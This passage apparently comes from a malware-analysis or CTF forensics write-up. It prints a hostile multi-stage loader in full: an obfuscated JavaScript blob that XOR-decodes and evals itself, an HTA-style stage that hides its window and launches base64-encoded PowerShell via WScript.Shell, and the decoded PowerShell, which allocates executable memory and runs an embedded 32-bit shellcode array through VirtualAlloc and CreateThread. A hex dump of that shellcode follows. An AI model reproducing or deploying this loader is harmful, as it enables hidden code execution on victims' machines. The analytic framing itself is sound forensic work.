21380e3b194e082670154418254736153e3666062118310b0d28440f1b1b57212f035e1d2f3210243156410948133d7578300e070f03230f2e5643783b3428750706232d2d0554297c2038132f1e37283e185221384f153b1e1e5b082101361a03055b182f32283b09055c7e2f1003211b0b76393a0e56750c565503514730340101471e2b1156797e1f3a01413806173f2c1e6927432f18023e02091c011774270c413c2521117d19301b1f143c05221e2e2c0135360521780b522905240b083f0e4c7c41335629125f041a003e01390c251f7c67411f0e075f353b0900233f7b030612063d31241802012a7a180c753a1e3c2f63263f3b193f222f3c2121080711382c3f470b2a2c0b672206000e34795f3d7f272d5f7d1f1e79280d33252b795c5b3500385f02293d450a21440379003230181027023b385105247b05111b3e576315252630062a073d091638110c2a045a2224130b1e2422452410465f0979032d6259201e042e1c28183546537b302437611c163d3a0c1a5e3d673f32071e0e642b35075e22235f40390501571c10112b0d1815081b0e2d253812150b7d240055223a1b223a21115c753d460317705763231a1113090a01017a4f0f2402702818030e33157e2c537a0f09210e1d2d1144743c1c5f3f3e3e1d7e282f111c1f230f35053122023e261b21591b00292434160b1e1e1e7c7023033d334f571a31210e3a2d35017c7c5e100e364f282c121f293c601353051d223f273912113d710858621b01313b7836212f2b2405210617210c0c37262b2f710b233503390f1d075d1d765f0a720d1b5f7914382e2f3705252c79764f31077f5f04272e23212a7d546e1f653f030706101237551b316b473c3418623d3b1b68201e50392f2228231c1b3a214538302215305e2d1f0b3f010e0b5a00365c7505152b21222a1b3e635864157a366a21372f2e77204306067d0428640525013126402428501c151e3c46082134230d13281a0c1132353b285707522b10033a3e003c13212f595a017717387f093d321a11130f05025a6e61002f150a0951002406337822400237240438342d3c14752c295a24233a035415150f09043c053867100f2d181018215c5c142d2a273a16205c497c420e552f09795f00481f2c162a131c7c580608081c533f2d311b31165e5d4612062d212513241d130b2211751b431b2c676436121630382b2b1472083537362f2f470b2a2c0b6321061c5e3d60572378271b5f7914382e2f3574092f0266471a1b1d572c361739071b72037d0b142d1f2a110217276008207b2001351f71361425132211312e210d160e1124155c7b2524250b1a2f0410203a705f0d72253d727766152b3e3a282625700d7f3b2b2d6d7c0d20130324472858026428383b200721254c3c3c0d422c0e3c46321e383d3425381f0f7413353a2a53045302290b3504142138030979621c6321006f483b237b20441e173c47575d22722d5501513b207d0766230d3837240405330c111f635c294110441b115209164408640152233b14362d35031636675d1d3e34021c093428166b0a165d061d6e5e0e211b0a3d01030966056032212169352c3647373b7510621b027f66242a2f123c7a2d096e271a2312741c212e023c2c2929220c2721241006247a082c370723271104273a58792378271b5f7914382e2f3705252f70047d3171764b2c261c45271f750d57103a04150011023f337808227b33111f35713611310b21280b2e390c02241111312d47231054271a2f0410203a705f0d72253d7173161e03211f230b250153543f1628730c33202e3e3f4a285f3039283b0d600435314d262f7d023921467b181b37361e0823081f0504283f02230b7a2b0c16272a0722121e497a71077003137b7130300a27130d0127567d753924067b1d1500207508693c653d061d635b3257021c722c0c53113e1f117b28191d300420112615143f160c0c1b3b493e173c3f240b08240237725105562d1979571e3a08013d070301787c064f071e5728281936233b70255301160b3120132438335021195b1c1a6632613e3f3f12162c2b2c17210c0c37262b2f7103305522660f7625051b620d1755336f08510048252a1f28370276624f1a700d6c1539104525257d08573160040f311a1f17377f1c336c1d40044466610a31072411350b3e220219312351267708305106372b29010b15734e2566516a62681e1602211033210b085e7f3f37235b22543615003f4a28591a2628152b14061b26510b2c6e27171e3c5c080f27211b0823000c741723140634026934350825162d2a205915445c02735439540024300f122217155301794c3227037b0d030c222807572079310d19210e0754203a5b013a423f1a660579172c2002007e52222c0c21033503003f675957312401151d24021e7a7e307b06346a61333103023f1729167a670332212162390068222b3f70135305163d312318270f3c7a2e005b3a3f253f74102b3f15163b2d18660d0c0c37262b2f710b2e272d342506360e3d60572e52571c0e540f097c22252b252f72755131000e5f06296a390715032f7d0b142d1f2a11023f337b15097f241a35355729151c102000361c18052c0e1108212e0925202a04372b0b182031450100600b147b59161e0025362827215d04790f7304710c203d3e0542782d060e27101e3f380437407226587a0215382c450b0006243413385d0f741f7a15161a056a2435090d140b78504050181a7f3c6e7a1810773b7d3417367a460c144c4106616a3a0f725507486f3863213b2e391e23392a23401c3c772540622a6c06311835383c113f3931203d252907005c303b125d7d5c192b1916465d36420c3f545c791c3103542d271e111053163575542a062e0235501f440464757b7f525d6f0b505a0e1f5b1a5e335f102a257b5b5a410103393520675f7a\";  DytJP2tQpTFSCSPfCj = \"JihKxAnKqmpPHXLXpFwSWS75itMzd9siGw\";  iVzIlGRpmThwNOCL1KG = \"dMu8EICKrYXXdxwaUrhHqwy9LmQoERde3472KqSopZ2\";  SmjeHzofw6cwLeOb6BpRB = \"X9S5J2H6uAeyQezWcwzPZrXk2IAWFPgBEU\";  EzijgiB9PspsjpmUGT = \"qJQTNYhedo17qygIRlh\";  zWxyXEVqMTD9xOVPl4qJ = \"9in6qk69cxs6u1MWY1vlmOG0LbrDUcoF5J\";  wQ5kIBdQNgtKKtnlJzFYm5vi = \"3DgKNXDhE2WOHzrFByxwYg4p6fhgkAwmZifaGWuxeJrc\";  LqMt2n = \"\";  for(xQI8nL9yS = 0;  xQI8nL9yS &lt; Jhp39.length;  xQI8nL9yS += 2)LqMt2n += String.fromCharCode(parseInt(Jhp39.substr(xQI8nL9yS, 2), 16));  kgyPNNw5dwbGQXunNbOgUy = \"bc7XctQByu2UKFdc9YvmwhUB3gPQt72z\";  pWnyRnFGYxfzvb9NaSF5drQ = \"zrXXlTyHXew4xwhQf5lCndWx5qKO9cTvZDYMg\";  CjqmG4rtcUjWCNzOLJpK = \"pxr67Avhtw4dC5EZR\";  sPDSdBAwGI1fFbcYkhESvZCV = \"qEhOFTieJYw92DVqv9eS7JvtWHJTCbvFpV7\";  OcxKNinMXDsMTZuSH8GpmV = \"N1n1vRv9voSFMJfxHOQmTjoZd41ffvvUkdztWM9ZK0aZt\";  BfynX5vgv6j = \"3d4HUJViPevp9ok8rvVv0QXvQWKboVFEOvAbl0lgdlSlEwiy18D1dZ80WyIftDBf146xCO8OaZwDr\";  Wcfvr3KUA7dQj = \"\";  for(s5tjXZAMqyTE0Zj = dUHeZSsh9Ein8ehXw = 0;  dUHeZSsh9Ein8ehXw &lt; LqMt2n.length;  dUHeZSsh9Ein8ehXw++) {      Wcfvr3KUA7dQj += String.fromCharCode(LqMt2n.substr(dUHeZSsh9Ein8ehXw, 1).charCodeAt()^BfynX5vgv6j.substr(s5tjXZAMqyTE0Zj, 1).charCodeAt());      s5tjXZAMqyTE0Zj = (s5tjXZAMqyTE0Zj &lt; BfynX5vgv6j.length - 1)?s5tjXZAMqyTE0Zj + 1:0;  }    debGISAgM8mZoOwhQl = \"2THqj1AWcgvTh7aTBDtmQInzbMwQmTrIJbEwLk2wRLA\";  L9abAniyzg0QJysBiOE = \"2AQosRFzVVVFvWSO5\";  G6ttaDIFtfXJ2rTTdCnLrm = \"LnTu8pj7qE1o1uk9WOxG2URDId1qYH\";  eval(Wcfvr3KUA7dQj);  dthS5nzOkjAWsQVGybC = \"lapVyIgMFCDhGBkMY\";  arTgKaUl7KUYRlKOz3pCA = \"HgahwpeUlnHkCobMdwTbwtjAMDGwI7GFyV9idM4\";  YBTJGZnZpktBQXq0wdkomLB = \"BGQUvQLCa1GCSSoa5U6x3\";  zBrSmpYsigYQbtw8fZqzdrel = \"TXvxkwiywWNQtWoZc3fJq2xil7k9Jdkpgo266WuVst\";  krqHBDMxarB2eoHmxkhm = \"RQxQJFR7RBxKmbh68\";  WVqaBpTVpt1M9ofdAOPggqR = \"IcYyfpiGXQCm79GAnep3F2\";\n\n\\Software\\lirs&gt; \nHives that have changed:\n #  Name\nNone!\n</code></pre> </li> <li> <p>Generated decoded JS: /tmp/recovered_flag/orhmkbye_stage.js</p> <pre><code>ZCqozRWlLAUUQZqj9efjtW = \"WzXSwWOu2RzdVlcQpB9eSehda2rO3hRfBmX1yCbxLqfz\";\nemEVUyGAUKApWupbIR2ANB4 = \"KrohGvZll2YAxyE69sWT6MF\";\nmGE1DmVHzmz9UoxXyunNWbcd = \"BG0AVYU3u62sd8I1ZjK4Fdz\";\nQv4zvBaMFHwqddEqDOHDw = \"CpJ25SMu6Yc4NSptN2sTheJ6uQDidj45KgxJb85\";\nPJDvFrcJNuwctCMo3MpfTM = \"a7btBsPWj12VCIkPL\";\nmeK4f6kIBNvDjKUbABlM = \"4joGmoFzSzkARtpHP1OZUVIMWtwq8bGji\";\nVpFxZdq2tbBGNPJJiO = \"p1dx8sE7weSy5OjbVcEcpYC0YB6RS\";\ntry {\n    moveTo( - 100, - 100);\n    resizeTo(0, 0);\n    z9E = new ActiveXObject(\"WScript.Shell\");\n    (z9E.Environment(\"Process\"))(\"legtuq\") = \"iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('I2dncmZzYmxwYnBzDQpzbGVlcCgxNSk7DQp0cnkgew0KICAgIA0KI2VsYmNpbA0KICAgIGZ1bmN0aW9uIGdkZWxlZ2F0ZSB7DQogICAgICAgIA0KI2RkemwNCiAgICAgICAgUGFyYW0gKFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldIFtUeXBlW11dICRQYXJhbWV0ZXJzLCBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldIFtUeXBlXSAkUmV0dXJuVHlwZSA9IFtWb2lkXSk7DQogICAgICAgIA0KI25ucmV0DQogICAgICAgICRUeXBlQnVpbGRlciA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgoTmV3IC0gT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgiUmVmbGVjdGVkRGVsZWdhdGUiKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgiSW5NZW1vcnlNb2R1bGUiLCAkZmFsc2UpLkRlZmluZVR5cGUoIlhYWCIsICJDbGFzcyxQdWJsaWMsU2VhbGVkLEFuc2lDbGFzcyxBdXRvQ2xhc3MiLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSk7DQogICAgICAgIA0KI2xxeWZrDQogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVDb25zdHJ1Y3RvcigiUlRTcGVjaWFsTmFtZSxIaWRlQnlTaWcsUHVibGljIiwgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkUGFyYW1ldGVycykuU2V0SW1wbGVtZW50YXRpb25GbGFncygiUnVudGltZSxNYW5hZ2VkIik7DQogICAgICAgIA0KI2xyZGl4aA0KICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTWV0aG9kKCJJbnZva2UiLCAiUHVibGljLEhpZGVCeVNpZyxOZXdTbG90LFZpcnR1YWwiLCAkUmV0dXJuVHlwZSwgJFBhcmFtZXRlcnMpLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoIlJ1bnRpbWUsTWFuYWdlZCIpOw0KICAgICAgICANCiNvb3BkDQogICAgICAgIHJldHVybiAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpOw0KICAgIH0NCg0KICAgIA0KI3Bycmt0a3INCiAgICBmdW5jdGlvbiBncHJvYyB7DQogICAgICAgIA0KI2dtaHduc2sNCiAgICAgICAgUGFyYW0gKFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldIFtTdHJpbmddICRNb2R1bGUsIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSldIFtTdHJpbmddICRQcm9jZWR1cmUpOw0KICAgICAgICANCiN5a3J1cQ0KICAgICAgICAkU3lzdGVtQXNzZW1ibHkgPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCl8V2hlcmUgLSBPYmplY3Qgew0KICAgICAgICAgICAgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAgLSBBbmQgJF8uTG9jYXRpb24uU3BsaXQoIlwiKVstMV0uRXF1YWxzKCJTeXN0ZW0uZGxsIil9Ow0KI2t1ZWdqDQokVW5zYWZlTmF0aXZlTWV0aG9kcz0kU3lzdGVtQXNzZW1ibHkuR2V0VHlwZSgiTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMiKTsNCiNreGp5bncNCnJldHVybiAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoIkdldFByb2NBZGRyZXNzIikuSW52b2tlKCRudWxsLEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgiR2V0TW9kdWxlSGFuZGxlIikuSW52b2tlKCRudWxsLCBAKCRNb2R1bGUpKSkpLCAkUHJvY2VkdXJlKSk7DQogICAgICAgIH0NCg0KICAgICAgICANCiN1eGJ1a2ZqcHZ4DQogICAgICAgIFtCeXRlW11dICRzYzMyID0gMHhkYSwgMHhjMSwgMHhiYSwgMHhlNiwgMHg2NCwgMHhmYSwgMHg3MiwgMHhkOSwgMHg3NCwgMHgyNCwgMHhmNCwgMHg1OCwgMHgyYiwgMHhjOSwgMHhiMSwgMHg1OCwgMHgzMSwgMHg1MCwgMHgxNywgMHg4MywgMHhlOCwgMHhmYywgMHgwMywgMHhiNiwgMHg3NywgMHgxOCwgMHg4NywgMHhjYSwgMHgzMCwgMHg1ZiwgMHg4YywgMHhjMiwgMHgyOSwgMHg5ZiwgMHg0ZCwgMHgyMiwgMHhhYSwgMHg2MSwgMHgxZiwgMHg2MywgMHhmYSwgMHgzMywgMHhjZSwgMHgzNSwgMHhiMiwgMHg4MiwgMHgyMiwgMHhkYywgMHgwYSwgMHg2ZSwgMHg5MCwgMHg3ZSwgMHhjMywgMHhmYiwgMHg0NywgMHg2NiwgMHg5YiwgMHg3MCwgMHgzNSwgMHhiNiwgMHg1MywgMHgwYywgMHhjOCwgMHhlNiwgMHgyYiwgMHgxZCwgMHg5YSwgMHg0YywgMHhlNiwgMHg2YywgMHhkNSwgMHg5OSwgMHhiZSwgMHg1ZiwgMHhkNSwgMHhiNSwgMHgwMywgMHhjMSwgMHhhOSwgMHhjNywgMHg1NywgMHgyMSwgMHgxMywgMHgwNiwgMHg2ZSwgMHgyYywgMHhkMiwgMHg4OSwgMHhiMCwgMHhjZCwgMHgzOSwgMHhkYiwgMHg3MywgMHg0MywgMHg4YSwgMHg1MCwgMHgyMSwgMHg0MywgMHg4MSwgMHgyNCwgMHhmYSwgMHhjYiwgMHg5NCwgMHg3OCwgMHg4OSwgMHg0YywgMHgxZSwgMHg3OCwgMHg4ZSwgMHg0YywgMHg1NywgMHhmZCwgMHg0ZSwgMHgzOCwgMHgwMCwgMHhiNSwgMHg0ZiwgMHgxMSwgMHg5ZSwgMHhjZSwgMHgxOCwgMHg4OSwgMHg1YiwgMHg1YiwgMHhkOCwgMHg4OSwgMHgyYSwgMHg1YSwgMHgwOSwgMHgyYSwgMHhmYSwgMHgxNCwgMHg1NiwgMHg2NCwgMHg0MiwgMHgyZiwgMHg5YywgMHhmZiwgMHgwZCwgMHgyZSwgMHgwYiwgMHhiMiwgMHhiYywgMHhmOSwgMHhmYiwgMHg3YywgMHg3ZiwgMHg1NSwgMHhiYSwgMHhiZiwgMHhiNiwgMHhhOCwgMHg3YywgMHg0MSwgMHg4OCwgMHg4YSwgMHg5ZSwgMHgzNCwgMHhmYiwgMHhhNiwgMHg1ZCwgMHhmYiwgMHhkZiwgMHgzZSwgMHgyNywgMHgzYSwgMHhmMSwgMHg0YiwgMHg3ZiwgMHg2NCwgMHhiNSwgMHgzOCwgMHgzZiwgMHhiMSwgMHg3YywgMHgzZiwgMHgxMCwgMHhkZiwgMHgzZiwgMHhiNCwgMHg5YywgMHg2OCwgMHg4NCwgMHg0MSwgMHhkYywgMHg3NCwgMHg0ZCwgMHg1NCwgMHgwZCwgMHhjNSwgMHhjNiwgMHg1MiwgMHgyNSwgMHg4ZSwgMHhkOSwgMHg4YSwgMHg3NCwgMHg1NywgMHg5YiwgMHg3MiwgMHgyOSwgMHgzZSwgMHg0MSwgMHhjMywgMHg4ZCwgMHg4MSwgMHgyYywgMHg4MiwgMHg3NywgMHg0YSwgMHg0YywgMHhlOCwgMHhhOCwgMHgwYiwgMHgwMCwgMHgwZiwgMHg0OCwgMHhkMywgMHhlNSwgMHhiNiwgMHhkMywgMHhhYywgMHg2ZSwgMHg1YSwgMHgwZCwgMHg3YiwgMHg4ZSwgMHhhNSwgMHgzMiwgMHhkOSwgMHgzOCwgMHhlMywgMHhjYywgMHhlMiwgMHhiOCwgMHgxMywgMHhjZiwgMHhlMiwgMHhiOCwgMHgxMywgMHg4NywgMHg2ZiwgMHgzNSwgMHgxMiwgMHgxNiwgMHg3MCwgMHg0NiwgMHg1NSwgMHhhMiwgMHg0MSwgMHhjZCwgMHgzYSwgMHg1NSwgMHg1ZSwgMHgwNCwgMHg3ZiwgMHhhOSwgMHgxNCwgMHgwNSwgMHgyOSwgMHgwYiwgMHhlZCwgMHhlYywgMHg0MCwgMHgzNiwgMHg4YywgMHgwZSwgMHhiZiwgMHgwMSwgMHgyYywgMHgzNCwgMHgxNywgMHhhZSwgMHgzNCwgMHhjOSwgMHg2ZCwgMHg0ZSwgMHhjMywgMHhkMSwgMHgwNCwgMHg0YiwgMHg4ZiwgMHg1NSwgMHhmNSwgMHgyMSwgMHg4MCwgMHgzMywgMHhmOSwgMHg5YywgMHgxZiwgMHg0ZCwgMHgyMywgMHhlMSwgMHg3NSwgMHgyZSwgMHhiZSwgMHg3YSwgMHg1NiwgMHg5ZSwgMHgyMywgMHhhMywgMHhiMSwgMHg4NSwgMHhjMCwgMHhjYiwgMHhkMiwgMHg2NSwgMHg1MCwgMHg2NywgMHg2NCwgMHgyMywgMHgwNiwgMHgwNCwgMHgyZiwgMHhmYywgMHhkNSwgMHhkYywgMHg4NiwgMHg0NCwgMHg3NSwgMHg1YiwgMHg3ZiwgMHgyNywgMHhlZCwgMHhkYywgMHgyNSwgMHhmNCwgMHhiNCwgMHg5MiwgMHg5MywgMHg4MywgMHgyMSwgMHgzZSwgMHg2ZSwgMHgwZCwgMHhjYSwgMHhiMSwgMHgyNSwgMHg4NCwgMHgyNCwgMHg0NywgMHhmMCwgMHg2NSwgMHgzNywgMHhjOCwgMHg2MSwgMHhkOSwgMHhjNCwgMHg2MiwgMHgwZiwgMHhlZSwgMHgxYSwgMHhmYSwgMHg4NCwgMHg2OSwgMHgzZSwgMHhjNSwgMHg1NiwgMHhmMywgMHg4ZSwgMHg0NywgMHgyYywgMHg2ZCwgMHg4MSwgMHhkNywgMHhmZSwgMHgyMiwgMHgzNiwgMHg2YiwgMHhhNiwgMHhhMywgMHhmNSwgMHhiNiwgMHg3ZiwgMHgyYzsNCiAgICAgICAgDQojcXp4dGgNCiAgICAgICAgJHByID0gKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChncHJvYyBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jKSwgKGdkZWxlZ2F0ZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW1VJbnQzMl0pKSkpLkludm9rZSgwLCAkc2MzMi5MZW5ndGgsIDB4MzAwMCwgMHg0MCk7DQogICAgICAgIA0KI3RqbXRocWMNCiAgICAgICAgaWYgKCRwciAgLSBuZSAwKSAgew0KICAgICAgICAgICAgJG1lbXNldCA9IChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZ3Byb2MgbXN2Y3J0LmRsbCBtZW1zZXQpLCAoZ2RlbGVnYXRlIEAoW1VJbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtJbnRQdHJdKSkpKTsNCiAgICAgICAgICAgIA0KI29scGF2cmFicXoNCiAgICAgICAgICAgIGZvciAoJGkgPSAwOw0KICAgICAgICAgICAgJGkgIC0gbGUgKCRzYzMyLkxlbmd0aCAtIDEpOw0KICAgICAgICAgICAgJGkrKykgew0KICAgICAgICAgICAgICAgICRtZW1zZXQuSW52b2tlKCgkcHIgKyAkaSksICRzYzMyWyRpXSwgMSkNCiAgICAgICAgICAgIH07DQogICAgICAgICAgICANCiNrcnl0DQogICAgICAgICAgICAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoKGdwcm9jIGtlcm5lbDMyLmRsbCBDcmVhdGVUaHJlYWQpLCAoZ2RlbGVnYXRlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKSkpKS5JbnZva2UoMCwgMCwgJHByLCAkcHIsIDAsIDApOw0KICAgICAgICAgICAgDQojc3F6dXp5DQogICAgICAgIH0NCg0KICAgICAgICBzbGVlcCgxMjAwKTsNCiAgICB9IGNhdGNoIHt9DQoNCiAgICBleGl0Ow0KICAgIA0KI2FrZHVhaA0KI3BpcnZuZXpucXZ2Y2Z5cWxiZHRmaGg=')))\";\n    B4Rcr8 = z9E.Run(\"C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe iex $env:legtuq\", 0, 1);\n} catch(e) {}\n\nclose();\n</code></pre> </li> <li> <p>Generated decoded PS: /tmp/recovered_flag/orhmkbye_stage.ps1</p> <pre><code>#ggrfsblpbps\nsleep(15);\ntry {\n\n#elbcil\n    function gdelegate {\n\n#ddzl\n        Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $Parameters, [Parameter(Position = 1)] [Type] $ReturnType = [Void]);\n\n#nnret\n        $TypeBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New - Object System.Reflection.AssemblyName(\"ReflectedDelegate\")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(\"InMemoryModule\", $false).DefineType(\"XXX\", \"Class,Public,Sealed,AnsiClass,AutoClass\", [System.MulticastDelegate]);\n\n#lqyfk\n        $TypeBuilder.DefineConstructor(\"RTSpecialName,HideBySig,Public\", [System.Reflection.CallingConventions]::Standard, $Parameters).SetImplementationFlags(\"Runtime,Managed\");\n\n#lrdixh\n        $TypeBuilder.DefineMethod(\"Invoke\", \"Public,HideBySig,NewSlot,Virtual\", $ReturnType, $Parameters).SetImplementationFlags(\"Runtime,Managed\");\n\n#oopd\n        return $TypeBuilder.CreateType();\n    }\n\n\n#prrktkr\n    function gproc {\n\n#gmhwnsk\n        Param ([Parameter(Position = 0, Mandatory = $True)] [String] $Module, [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure);\n\n#ykruq\n        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies()|Where - Object {\n            $_.GlobalAssemblyCache  - And $_.Location.Split(\"\\\")[-1].Equals(\"System.dll\")};\n#kuegj\n$UnsafeNativeMethods=$SystemAssembly.GetType(\"Microsoft.Win32.UnsafeNativeMethods\");\n#kxjynw\nreturn $UnsafeNativeMethods.GetMethod(\"GetProcAddress\").Invoke($null,@([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr),$UnsafeNativeMethods.GetMethod(\"GetModuleHandle\").Invoke($null, @($Module)))), $Procedure));\n        }\n\n\n#uxbukfjpvx\n        [Byte[]] $sc32 = 0xda, 0xc1, 0xba, 0xe6, 0x64, 0xfa, 0x72, 0xd9, 0x74, 0x24, 0xf4, 0x58, 0x2b, 0xc9, 0xb1, 0x58, 0x31, 0x50, 0x17, 0x83, 0xe8, 0xfc, 0x03, 0xb6, 0x77, 0x18, 0x87, 0xca, 0x30, 0x5f, 0x8c, 0xc2, 0x29, 0x9f, 0x4d, 0x22, 0xaa, 0x61, 0x1f, 0x63, 0xfa, 0x33, 0xce, 0x35, 0xb2, 0x82, 0x22, 0xdc, 0x0a, 0x6e, 0x90, 0x7e, 0xc3, 0xfb, 0x47, 0x66, 0x9b, 0x70, 0x35, 0xb6, 0x53, 0x0c, 0xc8, 0xe6, 0x2b, 0x1d, 0x9a, 0x4c, 0xe6, 0x6c, 0xd5, 0x99, 0xbe, 0x5f, 0xd5, 0xb5, 0x03, 0xc1, 0xa9, 0xc7, 0x57, 0x21, 0x13, 0x06, 0x6e, 0x2c, 0xd2, 0x89, 0xb0, 0xcd, 0x39, 0xdb, 0x73, 0x43, 0x8a, 0x50, 0x21, 0x43, 0x81, 0x24, 0xfa, 0xcb, 0x94, 0x78, 0x89, 0x4c, 0x1e, 0x78, 0x8e, 0x4c, 0x57, 0xfd, 0x4e, 0x38, 0x00, 0xb5, 0x4f, 0x11, 0x9e, 0xce, 0x18, 0x89, 0x5b, 0x5b, 0xd8, 0x89, 0x2a, 0x5a, 0x09, 0x2a, 0xfa, 0x14, 0x56, 0x64, 0x42, 0x2f, 0x9c, 0xff, 0x0d, 0x2e, 0x0b, 0xb2, 0xbc, 0xf9, 0xfb, 0x7c, 0x7f, 0x55, 0xba, 0xbf, 0xb6, 0xa8, 0x7c, 0x41, 0x88, 0x8a, 0x9e, 0x34, 0xfb, 0xa6, 0x5d, 0xfb, 0xdf, 0x3e, 0x27, 0x3a, 0xf1, 0x4b, 0x7f, 0x64, 0xb5, 0x38, 0x3f, 0xb1, 0x7c, 0x3f, 0x10, 0xdf, 0x3f, 0xb4, 0x9c, 0x68, 0x84, 0x41, 0xdc, 0x74, 0x4d, 0x54, 0x0d, 0xc5, 0xc6, 0x52, 0x25, 0x8e, 0xd9, 0x8a, 0x74, 0x57, 0x9b, 0x72, 0x29, 0x3e, 0x41, 0xc3, 0x8d, 0x81, 0x2c, 0x82, 0x77, 0x4a, 0x4c, 0xe8, 0xa8, 0x0b, 0x00, 0x0f, 0x48, 0xd3, 0xe5, 0xb6, 0xd3, 0xac, 0x6e, 0x5a, 0x0d, 0x7b, 0x8e, 0xa5, 0x32, 0xd9, 0x38, 0xe3, 0xcc, 0xe2, 0xb8, 0x13, 0xcf, 0xe2, 0xb8, 0x13, 0x87, 0x6f, 0x35, 0x12, 0x16, 0x70, 0x46, 0x55, 0xa2, 0x41, 0xcd, 0x3a, 0x55, 0x5e, 0x04, 0x7f, 0xa9, 0x14, 0x05, 0x29, 0x0b, 0xed, 0xec, 0x40, 0x36, 0x8c, 0x0e, 0xbf, 0x01, 0x2c, 0x34, 0x17, 0xae, 0x34, 0xc9, 0x6d, 0x4e, 0xc3, 0xd1, 0x04, 0x4b, 0x8f, 0x55, 0xf5, 0x21, 0x80, 0x33, 0xf9, 0x9c, 0x1f, 0x4d, 0x23, 0xe1, 0x75, 0x2e, 0xbe, 0x7a, 0x56, 0x9e, 0x23, 0xa3, 0xb1, 0x85, 0xc0, 0xcb, 0xd2, 0x65, 0x50, 0x67, 0x64, 0x23, 0x06, 0x04, 0x2f, 0xfc, 0xd5, 0xdc, 0x86, 0x44, 0x75, 0x5b, 0x7f, 0x27, 0xed, 0xdc, 0x25, 0xf4, 0xb4, 0x92, 0x93, 0x83, 0x21, 0x3e, 0x6e, 0x0d, 0xca, 0xb1, 0x25, 0x84, 0x24, 0x47, 0xf0, 0x65, 0x37, 0xc8, 0x61, 0xd9, 0xc4, 0x62, 0x0f, 0xee, 0x1a, 0xfa, 0x84, 0x69, 0x3e, 0xc5, 0x56, 0xf3, 0x8e, 0x47, 0x2c, 0x6d, 0x81, 0xd7, 0xfe, 0x22, 0x36, 0x6b, 0xa6, 0xa3, 0xf5, 0xb6, 0x7f, 0x2c;\n\n#qzxth\n        $pr = ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc kernel32.dll VirtualAlloc), (gdelegate @([IntPtr], [UInt32], [UInt32], [UInt32]) ([UInt32])))).Invoke(0, $sc32.Length, 0x3000, 0x40);\n\n#tjmthqc\n        if ($pr  - ne 0)  {\n            $memset = ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc msvcrt.dll memset), (gdelegate @([UInt32], [UInt32], [UInt32]) ([IntPtr]))));\n\n#olpavrabqz\n            for ($i = 0;\n            $i  - le ($sc32.Length - 1);\n            $i++) {\n                $memset.Invoke(($pr + $i), $sc32[$i], 1)\n            };\n\n#kryt\n            ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc kernel32.dll CreateThread), (gdelegate @([IntPtr], [UInt32], [UInt32], [UInt32], [UInt32], [IntPtr]) ([IntPtr])))).Invoke(0, 0, $pr, $pr, 0, 0);\n\n#sqzuzy\n        }\n\n        sleep(1200);\n    } catch {}\n\n    exit;\n\n#akduah\n#pirvneznqvvcfyqlbdtfhh\n</code></pre> </li> <li> <p>Extracted shellcode: /tmp/recovered_flag/orhmkbye_sc32.bin</p> <pre><code>dac1 bae6 64fa 72d9 7424 f458 2bc9 b158\n3150 1783 e8fc 03b6 7718 87ca 305f 8cc2\n299f 4d22 aa61 1f63 fa33 ce35 b282 22dc\n0a6e 907e 